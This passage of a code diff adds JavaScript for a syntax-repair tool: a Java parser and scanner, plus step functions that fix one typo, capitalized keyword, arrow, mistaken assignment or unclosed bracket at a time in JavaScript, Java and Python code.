+    expect('{');
+    if(kw==='enum'){
+      if(!at(';')&&!at('}')){
+        do{
+          while(at('@')){ nx(); expectId(); if(at('('))skipBalanced('(',')'); }
+          expectId('enum constant');
+          if(at('('))skipBalanced('(',')');
+          if(at('{'))skipBalanced('{','}');
+        }while(at(',')&&(nx(),true));
+      }
+      if(at(';'))nx();
+      members();
+    } else members();
+    expect('}');
+  }
+  function members(){
+    while(!at('}')&&!kind('eof')){
+      if(at(';')){ nx(); continue; }
+      if(at('{')){ skipBalanced('{','}'); continue; }
+      if(atKw('class')||atKw('interface')||atKw('enum')||(at('@')&&tk(1).t==='interface')){ typeDecl(); continue; }
+      mods();
+      if(at('<'))typeParams();
+      parseType();
+      if(at('(')){ params(); throwsOpt(); bodyOrSemi(); continue; }
+      expectId('member name');
+      if(at('{'))err("'(' expected",tk());
+      if(at('(')){ params(); throwsOpt(); bodyOrSemi(); continue; }
+      while(at('[')&&tk(1).t===']'){ nx(); nx(); }
+      if(at('=')){ nx(); varInit(); }
+      while(at(',')){ nx(); expectId('field name'); while(at('[')&&tk(1).t===']'){ nx(); nx(); } if(at('=')){ nx(); varInit(); } }
+      expect(';');
+    }
+  }
+  function block(){ expect('{'); while(!at('}')&&!kind('eof'))stmt(); expect('}'); }
+  function arrayInit(){
+    expect('{');
+    while(!at('}')&&!kind('eof')){
+      if(at('{'))arrayInit(); else expr();
+      if(at(',')){ nx(); if(at('}'))break; continue; }
+      break;
+    }
+    expect('}');
+  }
+  function varInit(){ if(at('{'))arrayInit(); else expr(); }
+  function declHead(){
+    const save=i; let ok=true;
+    try{
+      if(atKw('final'))nx();
+      parseType();
+      if(!kind('id'))ok=false;
+      else{ nx(); while(at('[')&&tk(1).t===']'){ nx(); nx(); }
+        if(!at('=')&&!at(';')&&!at(',')&&!at(':'))ok=false; }
+    }catch(e){ ok=false; }
+    if(!ok){ i=save; return false; }
+    if(at(':')){ i=save; return false; }
+    if(at('=')){ nx(); varInit(); }
+    while(at(',')){ nx(); expectId(); while(at('[')&&tk(1).t===']'){ nx(); nx(); } if(at('=')){ nx(); varInit(); } }
+    return true;
+  }
+  function forEachHead(){
+    const save=i; let ok=true;
+    try{ if(atKw('final'))nx(); parseType(); if(!kind('id'))ok=false;
+      else{ nx(); while(at('[')&&tk(1).t===']'){ nx(); nx(); } if(!at(':'))ok=false; } }catch(e){ ok=false; }
+    if(!ok){ i=save; return false; }
+    nx(); expr(); return true;
+  }
+  function stmt(){
+    if(at('{')){ block(); return; }
+    if(at(';')){ nx(); return; }
+    if(kind('kw')){
+      switch(tk().t){
+        case 'if': nx(); expect('('); expr(); expect(')'); stmt(); if(atKw('else')){ nx(); stmt(); } return;
+        case 'for': nx(); expect('(');
+          if(at(';'))nx();
+          else if(!forEachHead()){
+            if(!declHead()){ do{ expr(); }while(at(',')&&(nx(),true)); }
+            expect(';'); if(!at(';'))expr(); expect(';');
+            if(!at(')')){ do{ expr(); }while(at(',')&&(nx(),true)); }
+          }
+          expect(')'); stmt(); return;
+        case 'while': nx(); expect('('); expr(); expect(')'); stmt(); return;
+        case 'do': nx(); stmt(); if(!atKw('while'))err("'while' expected",tk()); nx(); expect('('); expr(); expect(')'); expect(';'); return;
+        case 'switch': nx(); expect('('); expr(); expect(')'); expect('{');
+          while(!at('}')&&!kind('eof')){
+            if(atKw('case')){ nx(); do{ expr(); }while(at(',')&&(nx(),true));
+              if(at(':'))nx();
+              else if(at('->')){ nx(); if(at('{'))skipBalanced('{','}'); }
+              else err("':' or '->' expected",tk());
+            } else if(atKw('default')){ nx();
+              if(at(':'))nx();
+              else if(at('->')){ nx(); if(at('{'))skipBalanced('{','}'); }
+            } else stmt();
+          }
+          expect('}'); return;
+        case 'try': nx(); if(at('('))skipBalanced('(',')'); block();
+          while(atKw('catch')){ nx(); if(at('('))skipBalanced('(',')'); block(); }
+          if(atKw('finally')){ nx(); block(); }
+          return;
+        case 'synchronized': nx(); if(at('(')){ nx(); expr(); expect(')'); } block(); return;
+        case 'return': nx(); if(!at(';')&&!at('}')&&!kind('eof'))expr(); expect(';'); return;
+        case 'throw': nx(); expr(); expect(';'); return;
+        case 'break': case 'continue': nx(); if(kind('id'))nx(); expect(';'); return;
+        case 'assert': nx(); expr(); if(at(':')){ nx(); expr(); } expect(';'); return;
+        case 'class': case 'interface': case 'enum': typeDecl(); return;
+      }
+    }
+    if(kind('id')&&tk(1).t===':'&&tk(2)&&tk(2).t!==':'){ nx(); nx(); stmt(); return; }
+    if(declHead()){ expect(';'); return; }
+    expr(); expect(';');
+  }
+  const ASSIGN_OPS=new Set(['=','+=','-=','*=','/=','%=','&=','|=','^=','<<=','>>=','>>>=']);
+  function expr(){ assignE(); }
+  function lambdaBody(){ if(at('{'))block(); else expr(); }
+  function lambdaAhead(){
+    let d=0;
+    for(let j=i;j<toks.length;j++){
+      const t=toks[j].t;
+      if(t==='(')d++;
+      else if(t===')'){ d--; if(!d)return !!(toks[j+1]&&toks[j+1].t==='->'); }
+      else if(t==='{'||t===';')return false;
+    }
+    return false;
+  }
+  function assignE(){
+    if(kind('id')&&tk(1).t==='->'){ nx(); nx(); lambdaBody(); return; }
+    if(at('(')&&lambdaAhead()){ skipBalanced('(',')'); nx(); lambdaBody(); return; }
+    ternaryE();
+    if(kind('op')&&ASSIGN_OPS.has(tk().t)){ nx(); assignE(); }
+  }
+  function ternaryE(){ binE(0); if(at('?')){ nx(); expr(); expect(':'); ternaryE(); } }
+  const BIN=[['||'],['&&'],['|'],['^'],['&'],['==','!='],['instanceof'],['<','>','<=','>='],['<<','>>','>>>'],['+','-'],['*','/','%']];
+  function binE(lv){
+    if(lv>=BIN.length){ unaryE(); return; }
+    binE(lv+1);
+    for(;;){
+      const t=tk(),row=BIN[lv];
+      if(row.includes(t.t)&&(t.kind==='op'||(t.kind==='kw'&&t.t==='instanceof'))){
+        nx();
+        if(t.t==='instanceof'){ parseType(); if(kind('id'))nx(); continue; }
+        binE(lv+1); continue;
+      }
+      break;
+    }
+  }
+  function unaryE(){
+    const t=tk();
+    if(t.kind==='op'&&(t.t==='+'||t.t==='-'||t.t==='!'||t.t==='~'||t.t==='++'||t.t==='--')){ nx(); unaryE(); return; }
+    if(at('(')&&castAhead()){ nx(); parseType(); expect(')'); unaryE(); return; }
+    postfixE();
+  }
+  function castAhead(){
+    let d=0,end=-1;
+    for(let j=i;j<toks.length;j++){
+      const t=toks[j].t;
+      if(t==='(')d++;
+      else if(t===')'){ d--; if(!d){ end=j; break; } }
+      else if(t===';'||t==='{')return false;
+    }
+    if(end<0||end===i+1)return false;
+    const save=i; let ok=true;
+    try{ nx(); parseType(); }catch(e){ ok=false; }
+    const consumed=i; i=save;
+    if(!ok||consumed!==end)return false;
+    const a=toks[end+1];
+    if(!a)return false;
+    return a.kind==='id'||a.kind==='num'||a.kind==='str'||a.kind==='chr'||a.t==='('||a.t==='this'||a.t==='new'||a.t==='super';
+  }
+  function postfixE(){
+    primaryE();
+    for(;;){
+      if(at('.')){
+        nx();
+        if(at('<')){ nx(); typeArgs(); }
+        if(kind('id')||tk().t==='class'||tk().t==='this'||tk().t==='super'||tk().t==='new'){ nx(); continue; }
+        err('<identifier> expected',tk());
+      }
+      if(tk().t==='::'){
+        nx();
+        if(at('<')){ nx(); typeArgs(); }
+        if(kind('id')||atKw('new')){ nx(); continue; }
+        err('<identifier> expected',tk());
+      }
+      if(at('(')){ nx(); while(!at(')')&&!kind('eof')){ expr(); if(!at(')'))expect(','); } expect(')'); continue; }
+      if(at('[')){ nx(); expr(); expect(']'); continue; }
+      if(tk().t==='++'||tk().t==='--'){ nx(); continue; }
+      break;
+    }
+  }
+  function primaryE(){
+    const t=tk();
+    if(t.kind==='num'||t.kind==='str'||t.kind==='chr'){ nx(); return; }
+    if(t.kind==='id'){ nx(); return; }
+    if(t.kind==='kw'){
+      if(t.t==='true'||t.t==='false'||t.t==='null'){ nx(); return; }
+      if(t.t==='this'||t.t==='super'){ nx();
+        if(at('(')){ nx(); while(!at(')')&&!kind('eof')){ expr(); if(!at(')'))expect(','); } expect(')'); }
+        return; }
+      if(t.t==='new'){ nx(); creator(); return; }
+      if(t.t==='void'){ nx(); if(at('.')&&tk(1).t==='class'){ nx(); nx(); } return; }
+    }
+    if(at('(')){ nx(); expr(); expect(')'); return; }
+    err('illegal start of expression',t);
+  }
+  function creator(){
+    if(at('<')){ nx(); typeArgs(); }
+    parseType();
+    if(at('(')){ nx(); while(!at(')')&&!kind('eof')){ expr(); if(!at(')'))expect(','); } expect(')');
+      if(at('{')){ nx(); members(); expect('}'); }
+      return; }
+    if(at('[')){
+      while(at('[')){ nx(); if(at(']'))nx(); else{ expr(); expect(']'); } }
+      if(at('{'))arrayInit();
+      return;
+    }
+    err("'(' or '[' expected",tk());
+  }
+  try{ cu(); }
+  catch(e){ if(e&&e.p)return {ok:false,msg:e.msg,line:e.line,col:e.col}; throw e; }
+  const types=toks.filter(t=>t.kind==='kw'&&(t.t==='class'||t.t==='interface'||t.t==='enum')).length;
+  return {ok:true,tokens:toks.length-1,types};
+}
+function javaScan(code){
+  const stack=[]; let i=0,line=1; const n=code.length;
+  while(i<n){
+    const c=code[i],d=code[i+1]||'';
+    if(c==='/'&&d==='/'){ while(i<n&&code[i]!=='\n')i++; continue; }
+    if(c==='/'&&d==='*'){ i+=2; let cl=false;
+      while(i<n){ if(code[i]==='\n')line++; if(code[i]==='*'&&code[i+1]==='/'){cl=true;i+=2;break;} i++; }
+      if(!cl)return{commentOpen:true,line};
+      continue; }
+    if(c==='"'&&code[i+1]==='"'&&code[i+2]==='"'){
+      const sl=line; i+=3; let cl=false;
+      while(i<n){ if(code[i]==='\n')line++; if(code[i]==='"'&&code[i+1]==='"'&&code[i+2]==='"'){cl=true;i+=3;break;} i++; }
+      if(!cl)return{unterminated:'"""',line:sl};
+      continue; }
+    if(c==='"'){ const sl=line; i++; let cl=false;
+      while(i<n){ const x=code[i]; if(x==='\\'){i+=2;continue;} if(x==='\n')break; if(x==='"'){cl=true;i++;break;} i++; }
+      if(!cl)return{unterminated:'"',line:sl};
+      continue; }
+    if(c==="'"){ const sl=line; i++; let cl=false;
+      while(i<n){ const x=code[i]; if(x==='\\'){i+=2;continue;} if(x==='\n')break; if(x==="'"){cl=true;i++;break;} i++; }
+      if(!cl)return{unterminated:"'",line:sl};
+      continue; }
+    if(c==='{'||c==='('||c==='[')stack.push({c,line});
+    else if(c==='}'||c===')'||c===']'){
+      const t=stack.pop();
+      const ok=t&&((t.c==='{'&&c==='}')||(t.c==='('&&c===')')||(t.c==='['&&c===']'));
+      if(!ok)return{extra:{ch:c,index:i,line,expected:t?t.c:null}};
+    }
+    if(c==='\n')line++;
+    i++;
+  }
+  return {stack};
+}
+
+/* ================================================================
+   STEP ENGINES — one call = at most ONE repair
+   ================================================================ */
+const JS_TYPOS=[
+  [/\bfuntion\b|\bfucntion\b|\bfnction\b|\bfuncton\b/g,'function'],
+  [/\bretrun\b|\breutrn\b|\bretun\b/g,'return'],
+  [/\bconsoel\b|\bcosole\b|\bconosle\b|\bconsle\b/g,'console'],
+  [/\bdocumnet\b|\bdocuemnt\b|\bdoucment\b/g,'document'],
+  [/\blenght\b|\blegnth\b/g,'length'],
+  [/\bture\b/g,'true'],[/\bflase\b|\bfasle\b/g,'false'],
+  [/\bwhiel\b|\bwhille\b/g,'while'],[/\besle\b/g,'else'],
+  [/\belif\b/g,'else if'],
+  [/\bsummmary\b|\bsumary\b/g,'summary'],
+  [/\bsetTimaout\b|\bsetTimeOut\b|\bsetTimout\b/g,'setTimeout'],
+  [/\bsetIntervel\b|\bsetInteval\b/g,'setInterval'],
+  [/\baddEventListner\b|\baddEventLisener\b/g,'addEventListener'],
+  [/\bgetElementByID\b/g,'getElementById'],
+  [/\bgetElmentById\b/g,'getElementById'],
+  [/\bquerySelctor\b/g,'querySelector'],
+  [/\bJSON\.stringfy\b|\bJSON\.strigify\b|\bJSON\.stringfiy\b/g,'JSON.stringify'],
+  [/\bJSON\.pase\b/g,'JSON.parse'],
+  [/\bMath\.rand\b/g,'Math.random'],
+  [/\bparseFlot\b/g,'parseFloat'],
+  [/\bwidnow\b|\bwindwo\b/g,'window'],
+  [/\blcoation\b|\bloaction\b|\blocaton\b/g,'location'],
+  [/\bfi(?=\s*\()/g,'if'],
+  [/\baler(?=\s*\()/g,'alert'],
+];
+function hitTyposJS(code){
+  const lines=code.split('\n');
+  for(let i=0;i<lines.length;i++){
+    const l=lines[i];
+    if(/^\s*(\/\/|\*|\/\*)/.test(l))continue;
+    for(const [re,to] of JS_TYPOS){
+      const m=l.match(re);
+      if(m){
+        const nl=l.replace(re,to);
+        return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+          repair:{rule:'TYPO — '+m[0]+' → '+to,line:i+1,before:trimMid(l),after:trimMid(nl)}};
+      }
+    }
+  }
+  return null;
+}
+function hitCapsJS(code){
+  const lines=code.split('\n');
+  const re=/^(\s*)(If|Elseif|Else|For|While|Return|Function|Const|Let|Var|Try|Catch|Finally|New|Break|Continue|Switch|Case|Default|Typeof|Do|Class|Throw)\b(?!\s*=[^=])/;
+  for(let i=0;i<lines.length;i++){
+    const m=lines[i].match(re);
+    if(m){
+      const nl=lines[i].replace(re,(a,ws,kw)=>ws+kw[0].toLowerCase()+kw.slice(1));
+      return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+        repair:{rule:'CAPITALIZED KEYWORD — '+m[2],line:i+1,before:trimMid(lines[i]),after:trimMid(nl)}};
+    }
+  }
+  return null;
+}
+function hitArrowsJS(code){
+  const lines=code.split('\n');
+  for(let i=0;i<lines.length;i++){
+    const l=lines[i];
+    const a=l.indexOf('->'),c=l.indexOf('//');
+    if(a===-1||(c!==-1&&c<a))continue;
+    const nl=l.replace(/->/g,'=>');
+    return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+      repair:{rule:'ARROW  ->  →  =>',line:i+1,before:trimMid(l),after:trimMid(nl)}};
+  }
+  return null;
+}
+function hitCondEqJS(code){
+  const lines=code.split('\n');
+  const re=/\b(if|while)\s*\(\s*([\w$.\[\]]+)\s*=\s*(?=["'`\d]|true\b|false\b|null\b)/g;
+  const test=/\b(if|while)\s*\(\s*[\w$.\[\]]+\s*=\s*(?=["'`\d]|true\b|false\b|null\b)/;
+  for(let i=0;i<lines.length;i++){
+    if(test.test(lines[i])){
+      const nl=lines[i].replace(re,'$1 ($2 === ');
+      return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+        repair:{rule:'ASSIGNMENT IN CONDITION  =  →  ===',line:i+1,before:trimMid(lines[i]),after:trimMid(nl)}};
+    }
+  }
+  return null;
+}
+function jsPositionalOne(code,r){
+  if(r.nooracle)return null;
+  const lines=code.split('\n');
+  const msg=(r.message||'').toLowerCase();
+  const L=r.line,C=r.col||0;
+  if(L==null)return null;
+  const mk=(i,nl,rule,after)=>({code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+    repair:{rule,line:i+1,before:trimMid(lines[i]),after:after!==undefined?after:trimMid(nl)}});
+  const mkRaw=(newCode,rule,line,before,after)=>({code:newCode,repair:{rule,line,before,after}});
+
+  if(/unterminated string/.test(msg)&&lines[L-1]!==undefined){
+    const line=lines[L-1]; let q=line[C];
+    if(!/["'`]/.test(q||''))q=(line.match(/["'`]/)||['"'])[0];
+    if(line.endsWith(q))return null;
+    return mk(L-1,line+q,'UNTERMINATED STRING','…'+q);
+  }
+  if(/unterminated template/.test(msg)&&lines[L-1]!==undefined) return mk(L-1,lines[L-1]+'`','UNTERMINATED TEMPLATE','…`');
+  if(/unterminated comment/.test(msg)&&lines[L-1]!==undefined) return mk(L-1,lines[L-1]+' */','UNTERMINATED COMMENT','… */');
+
+  const isEOF=/unexpected end/.test(msg)||(L>lines.length)||(L===lines.length&&(lines[L-1]||'').length<=C);
+  if(isEOF){
+    const s=jsScan(code);
+    if(s.strEnd)return mkRaw(code+s.strEnd,'UNTERMINATED STRING',null,'(end of file)',s.strEnd);
+    if(s.stack.length){
+      const map={'(':')','[':']','{':'}'};
+      const closers=s.stack.slice().reverse().map(t=>map[t.c]).join('');
+      return mkRaw(code.replace(/\s*$/,'')+'\n'+closers,'UNCLOSED BRACKET'+(s.stack.length>1?'S':''),s.stack[s.stack.length-1].line,'(end of file)',closers);
+    }
+    return null;
+  }
+  if(!/unexpected/.test(msg))return null;
+  const line=lines[L-1]||'';
+  const ch=line[C]||'';
+  if(ch===')'||ch===']'||ch==='}'){
+    const s=jsScan(code);
+    if(s.extra&&code[s.extra.index]===ch){
+      const {line:li,col:ci}=idxToPos(code,s.extra.index);
+      const before=lines[li]||'';
+      const nl=before.slice(0,ci)+before.slice(ci+1);
+      return mkRaw(lines.slice(0,li).concat([nl],lines.slice(li+1)).join('\n'),'STRAY "'+ch+'"',li+1,trimMid(before),trimMid(nl));
+    }
+    return null;
+  }
+  const m2=line.match(/^(\s*)(if|while|for|switch)\b([^{]*)\{(.*)$/);
+  if(m2&&!/[()]/.test(m2[3])&&m2[3].trim()) return mk(L-1,m2[1]+m2[2]+'('+m2[3].trim()+') {'+m2[4],'MISSING CONDITION PARENS');
+  if(/[A-Za-z_$]/.test(ch)&&line.slice(0,C).trim()===''){
+    const pi=L-2;
+    if(pi>=0&&surplusOf(lines[pi],'(',')')>0){
+      return mkRaw(lines.slice(0,pi).concat([lines[pi]+')'],lines.slice(pi+1)).join('\n'),'MISSING ")"',pi+1,trimMid(lines[pi]),trimMid(lines[pi])+')');
+    }
+    return null;
+  }
+  if(ch==='{'&&surplusOf(line.slice(0,C),'(',')')>0) return mk(L-1,line.slice(0,C)+')'+line.slice(C),'MISSING ")"','…) { …');
+  if(ch==='('&&surplusOf(line.slice(0,C),'{','}')>0) return mk(L-1,line.slice(0,C)+'}'+line.slice(C),'MISSING "}"','…} ( …');
+  return null;
+}
+function stepJS(code){
+  const pre=preFixOne(code); if(pre)return pre;
+  let r;
+  if(r=hitTyposJS(code))return r;
+  if(r=hitCapsJS(code))return r;
+  if(r=hitArrowsJS(code))return r;
+  if(r=hitCondEqJS(code))return r;
+  const p=parseJS(code);
+  if(p.ok)return {halt:true,clean:true};
+  const pos=jsPositionalOne(code,p);
+  if(pos)return pos;
+  return {halt:true,clean:false,err:{message:p.message||'syntax error',line:p.line}};
+}
+
+/* ---- Java steps ---- */
+const JAVA_TYPOS=[
+  [/\bSystem\.out\.printIn\b/g,'System.out.println','printIn → println'],
+  [/\bSystem\.out\.printline\b/g,'System.out.println','printline → println'],
+  [/\bSystem\.out\.prinln\b/g,'System.out.println','prinln → println'],
+  [/\bSystem\.our\.print/g,'System.out.print','our → out'],
+  [/\bSystm\.out\b|\bSytem\.out\b/g,'System.out','System typo'],
+  [/\bpubic\b|\bpubllic\b|\bpulbic\b/g,'public','public'],
+  [/\bprivte\b|\bpirvate\b|\bprovate\b|\bprivtae\b/g,'private','private'],
+  [/\bproctected\b|\bpotected\b|\bprotectd\b/g,'protected','protected'],
+  [/\bstaitc\b|\bstatc\b|\bstaic\b|\bstaticc\b/g,'static','static'],
+  [/\bfianl\b|\bfinla\b/g,'final','final'],
+  [/\bviod\b|\bvoide\b/g,'void','void'],
+  [/\bclsss\b|\bcalss\b|\bclaass\b/g,'class','class'],
+  [/\bArryList\b|\bArraylist\b|\bArrayListt\b/g,'ArrayList','ArrayList'],
+  [/\bHashmap\b/g,'HashMap','HashMap'],
+  [/\bHashset\b/g,'HashSet','HashSet'],
+  [/\bIntger\b|\bInetger\b/g,'Integer','Integer'],
+  [/\bScnner\b|\bScaner\b/g,'Scanner','Scanner'],
+  [/\bStrign\b|\bStirng\b|\bSring\b/g,'String','String'],
+  [/\btoStrng\b|\btoSring\b/g,'toString','toString'],
+  [/\bequalsIgnorCase\b/g,'equalsIgnoreCase','equalsIgnoreCase'],
+  [/\bcomapreTo\b/g,'compareTo','compareTo'],
+  [/\blenght\b|\blengh\b/g,'length','length'],
+  [/\bretrun\b|\bretun\b/g,'return','return'],
+];
+function hitTyposJava(code){
+  const lines=code.split('\n');
+  const caps=/^(\s*)(Public|Private|Protected|Static|Final|Void|Class|Interface|Enum|Return|Import|Package|Int|Double|Float|Boolean|Char|Long|Short|Byte|New|Throw|Try|Catch|While|For|If|Else|Switch|Case|Break|Continue|Extends|Implements)\b/;
+  for(let i=0;i<lines.length;i++){
+    const l=lines[i];
+    if(/^\s*(\/\/|\*|\/\*)/.test(l))continue;
+    for(const [re,to,name] of JAVA_TYPOS){
+      const m=l.match(re);
+      if(m){
+        const nl=l.replace(re,to);
+        return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+          repair:{rule:'TYPO — '+name,line:i+1,before:trimMid(l),after:trimMid(nl)}};
+      }
+    }
+    const cm=l.match(caps);
+    if(cm){
+      const nl=l.slice(0,cm[1].length)+cm[2][0].toLowerCase()+cm[2].slice(1)+l.slice(cm[1].length+cm[2].length);
+      if(nl!==l){
+        return {code:lines.slice(0,i).concat([nl],lines.slice(i+1)).join('\n'),
+          repair:{rule:'CAPITALIZED KEYWORD — '+cm[2],line:i+1,before:trimMid(l),after:trimMid(nl)}};
+      }
+    }
+  }
+  return null;
+}
+function hitCondAssignJava(code){
+  const re=/\b(if|while)\s*\(/g; let m;
+  while((m=re.exec(code))){
+    const start=m.index+m[0].length;
+    let d=1,j=start,q=null,end=-1;
+    for(;j<code.length;j++){
+      const c=code[j];
+      if(q){ if(c==='\\'){j++;} else if(c===q)q=null; continue; }
+      if(c==='"'||c==="'"){ q=c; continue; }
+      if(c==='(')d++; else if(c===')'){ d--; if(!d){ end=j; break; } }
+    }
+    if(end<0)continue;
+    const inner=code.slice(start,end);
+    let k=0,found=-1;
+    while(k<inner.length){
+      const c=inner[k];
+      if(c==='"'||c==="'"){ const qq=c; k++; while(k<inner.length){ if(inner[k]==='\\'){k+=2;continue;} if(inner[k]===qq)break; k++; } k++; continue; }
+      if(c==='='&&(inner[k+1]||'')!=='='&&!['=','!','<','>','+','-','*','/','%','&','|','^'].includes(inner[k-1]||'')){ found=k; break; }
+      k++;
+    }
+    if(found<0)continue;
+    let rr=found+1; while(rr<inner.length&&(inner[rr]===' '||inner[rr]==='\t'))rr++;
+    if(!/[0-9"']/.test(inner[rr]||''))continue;
+    const abs=start+found,ln=lineOf(code,abs);
+    const pre=inner.slice(Math.max(0,found-14),found);
+    const post=inner.slice(found+1,found+15);
+    return {code:code.slice(0,abs)+'=='+code.slice(abs+1),
+      repair:{rule:'ASSIGNMENT IN CONDITION  =  →  ==',line:ln,before:trimMid(pre+'='+post),after:trimMid(pre+'=='+post)}};
+  }
+  return null;
+}
+function javaPositionalOne(code,r){
+  const lines=code.split('\n');
+  const msg=r.msg||'';
+  const abs=(L,C)=>{ let x=0; for(let k=0;k<L-1&&k<lines.length;k++)x+=lines[k].length+1; return x+Math.min(C||0,(lines[L-1]||'').length); };
+  const lineTxt=L=>lines[L-1]||'';
+  if(/^stray character/.test(msg)){
+    const ix=abs(r.line,r.col||0);
+    const ch=(msg.match(/"(.*)"$/)||[,'?'])[1];
+    return {code:code.slice(0,ix)+code.slice(ix+1),
+      repair:{rule:'STRAY CHARACTER "'+ch+'"',line:r.line,before:trimMid(lineTxt(r.line)),after:'(removed)'}};
+  }
+  let toks; try{ toks=lexJava(code); }catch(e){ return null; }
+  let ei=-1;
+  for(let k=0;k<toks.length;k++)if(toks[k].line===r.line&&toks[k].col===(r.col||0)){ ei=k; break; }
+  if(ei<0)for(let k=0;k<toks.length;k++)if(toks[k].line===r.line&&toks[k].col>=(r.col||0)){ ei=k; break; }
+  if(ei<0)return null;
+  const et=toks[ei],prev=ei>0?toks[ei-1]:null,isEOF=et.kind==='eof';
+  const ins=(ix,txt,rule,line,before,after)=>({code:code.slice(0,ix)+txt+code.slice(ix),
+    repair:{rule,line,before,after}});
+
+  if(msg.includes("'(' expected")&&prev&&prev.kind==='id'){
+    const ix=abs(et.line,et.col);
+    return ins(ix,'() ','MISSING "( )" — METHOD PARAMS',prev.line,trimMid(lineTxt(prev.line)),trimMid(lineTxt(prev.line))+'()');
+  }
+  if((msg.includes('illegal start')&&et.kind==='kw'&&['public','private','protected','static','final','void'].includes(et.t)&&et.col===0)
+     ||(msg.includes("'class', 'interface', or 'enum'")&&et.col===0)){
+    const s=javaScan(code.slice(0,abs(et.line,et.col)));
+    if(s.stack&&s.stack.length){
+      const ix=abs(et.line,et.col);
+      return ins(ix,'}\n','MISSING "}"',Math.max(1,et.line-1),'…','} before '+et.t);
+    }
+  }
+  if(msg.includes("';'")){
+    if(et.t===','&&prev){
+      let d=0,j=ei-1,open=-1;
+      while(j>=0){ const t=toks[j].t;
+        if(t===')'||t===']'||t==='}')d++;
+        else if(t==='('||t==='['||t==='{'){ if(d===0){ open=j; break; } d--; }
+        j--;
+      }
+      if(open>0&&toks[open-1].kind==='kw'&&toks[open-1].t==='for'){
+        const ix=abs(et.line,et.col),b=lineTxt(et.line);
+        return {code:code.slice(0,ix)+';'+code.slice(ix+1),
+          repair:{rule:'FOR-SEPARATOR  ,  →  ;',line:et.line,before:trimMid(b),after:trimMid(b.slice(0,et.col)+';'+b.slice(et.col+1))}};
+      }
+    }
+    if(prev&&!isEOF){
+      const BAD=new Set(['{','(','[',',',';','.']);
+      if(!BAD.has(prev.t)&&!(prev.kind==='op'&&prev.t.length>1)){
+        const ix=abs(prev.line,prev.col)+prev.len;
+        return ins(ix,';','MISSING ";"',prev.line,trimMid(lineTxt(prev.line)),trimMid(lineTxt(prev.line))+' …;');
+      }
+    }
+    return null;
+  }
+  const mc=msg.match(/'([)\]}])' expected/);
+  if(mc&&!isEOF){
+    const ch=mc[1],ix=abs(et.line,et.col);
+    return ins(ix,ch,'MISSING "'+ch+'"',et.line,trimMid(lineTxt(et.line)),'… '+ch+' …');
+  }
+  if(isEOF){
+    const s=javaScan(code);
+    if(s.stack&&s.stack.length){
+      const map={'(':')','[':']','{':'}'};
+      const cl=s.stack.slice().reverse().map(t=>map[t.c]).join('');
+      return {code:code.replace(/\s*$/,'')+'\n'+cl,
+        repair:{rule:'UNCLOSED BRACKET'+(s.stack.length>1?'S':''),line:s.stack[s.stack.length-1].line,before:'(end of file)',after:cl}};
+    }
+  }
+  if(msg.includes('illegal start')&&et.t===','&&prev&&(prev.t===','||prev.t==='(')){
+    const ix=abs(et.line,et.col);
+    return {code:code.slice(0,ix)+code.slice(ix+1),
+      repair:{rule:'STRAY ","',line:et.line,before:trimMid(lineTxt(et.line)),after:'(removed one)'}};
+  }
+  return null;
+}
+function javaScanOne(code){
+  const s=javaScan(code);
+  if(s.commentOpen)return {code:code.replace(/\s*$/,'')+'\n*/',repair:{rule:'UNTERMINATED COMMENT',line:s.line,before:'/* …',after:'… */'}};
+  if(s.unterminated){
+    const ls2=code.split('\n'),q=s.unterminated;
+    ls2[s.line-1]=(ls2[s.line-1]||'').replace(/\s*$/,'')+q;
+    const name=q==='"'?'UNTERMINATED STRING':q==="'"?'UNTERMINATED CHAR':'UNTERMINATED TEXT BLOCK';
+    return {code:ls2.join('\n'),repair:{rule:name,line:s.line,before:'…',after:'… '+q}};
+  }
+  if(s.extra){
+    if(s.extra.expected==='('&&s.extra.ch==='}'){
+      const prefix=code.slice(0,s.extra.index);
+      const b=prefix.lastIndexOf('{');
+      if(b>-1){
+        const pos=idxToPos(code,b);
+        const ls2=code.split('\n');
+        const before=ls2[pos.line]||'';
+        const nl=before.slice(0,pos.col)+')'+before.slice(pos.col);
+        return {code:ls2.slice(0,pos.line).concat([nl],ls2.slice(pos.line+1)).join('\n'),
+          repair:{rule:'MISSING ")" — BEFORE "{"',line:pos.line+1,before:trimMid(before),after:trimMid(nl)}};
+      }
+    }
+    const li=s.extra.line,ls2=code.split('\n');
+    const pos=s.extra.index-ls2.slice(0,li-1).reduce((a,l)=>a+l.length+1,0);
+    const before=ls2[li-1]||'';
+    ls2[li-1]=before.slice(0,pos)+before.slice(pos+1);
+    return {code:ls2.join('\n'),repair:{rule:'STRAY "'+s.extra.ch+'"',line:li,before:trimMid(before),after:trimMid(ls2[li-1])}};
+  }
+  if(s.stack&&s.stack.length){
+    const map={'(':')','[':']','{':'}'};
+    const cl=s.stack.slice().reverse().map(t=>map[t.c]).join('');
+    return {code:code.replace(/\s*$/,'')+'\n'+cl,
+      repair:{rule:'UNCLOSED BRACKET'+(s.stack.length>1?'S':''),line:s.stack[s.stack.length-1].line,before:'(end of file)',after:cl}};
+  }
+  return null;
+}
+function stepJava(code){
+  const pre=preFixOne(code); if(pre)return pre;
+  let r;
+  if(r=hitTyposJava(code))return r;
+  if(r=hitCondAssignJava(code))return r;
+  const p=parseJava(code);
+  if(p.ok)return {halt:true,clean:true};
+  const pos=javaPositionalOne(code,p); if(pos)return pos;
+  const sc=javaScanOne(code); if(sc)return sc;
+  return {halt:true,clean:false,err:{message:p.msg||'syntax error',line:p.line}};
+}
+
+/* ---- Python steps ---- */
+function pyMaskStrings(line){
+  const m=new Uint8Array(line.length); let q=null;
+  for(let i=0;i<line.length;i++){ const c=line[i];
+    if(q){ m[i]=1; if(c==='\\'){ if(i+1<line.length)m[i+1]=1; i++; } else if(c===q)q=null; }
+    else if(c==='"'||c==="'"){ q=c; m[i]=1; } }
+  return m;
+}
+function pyStripComment(line){
+  const m=pyMaskStrings(line);
+  for(let i=0;i<line.length;i++)if(line[i]==='#'&&!m[i])return line.slice(0,i);
+  return line;
+}
+function pyLineBrackets(line){
+  const m=pyMaskStrings(line); const st=[];
+  for(let i=0;i<line.length;i++){
+    if(m[i])continue;
+    const c=line[i];
+    if(c==='('||c==='['||c==='{')st.push(c);
